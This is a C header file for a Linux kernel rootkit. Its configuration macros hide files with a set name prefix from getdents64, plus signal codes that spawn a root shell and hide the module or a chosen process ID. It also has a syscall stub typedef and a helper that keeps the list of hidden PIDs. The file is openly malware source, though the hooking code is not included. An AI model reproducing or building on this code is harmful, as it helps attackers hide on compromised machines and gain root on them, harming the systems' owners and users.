#include <linux/version.h>
#include <linux/list.h>
#include <linux/slab.h>
#include <linux/kernel.h>

#ifndef ROOTKIT_UTILS_H
#define ROOTKIT_UTILS_H

// ===== CONFIG ======

// File prefix that excludes entries from getdents64
#define DIRECTORY_EXCLUSION_PREFIX "rtkit_exclude"

// Signal code that drops a root shell
#define ROOT_SHELL_SIGNAL_CODE 64

// Signal code that toggles rootkit visablity
#define TOGGLE_MODULE_HIDE_SIGNAL_CODE 65

// Signal code to change the hidden pid
#define TOGGLE_PID_HIDE_SIGNAL_CODE 66

// // Default port to hide, if equal to 0, hides none
// #define PORT_HIDE_DEFAULT_PORT 0

// ===================

#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
#define PTREGS_SYSCALL_STUBS 1
typedef asmlinkage long (*tt_syscall)(const struct pt_regs *);
#endif

struct linked_list_node {
	void *data;
	struct list_head list;
};

static LIST_HEAD(excluded_pids);

void append_node(struct list_head *list, void * data) {
	struct linked_list_node *entry;
	entry = kmalloc(sizeof *entry, GFP_KERNEL);
	if (!entry)
		return;
	entry->data = data;
	INIT_LIST_HEAD(&entry->list);
	list_add_tail(&entry->list, list);
}

#endif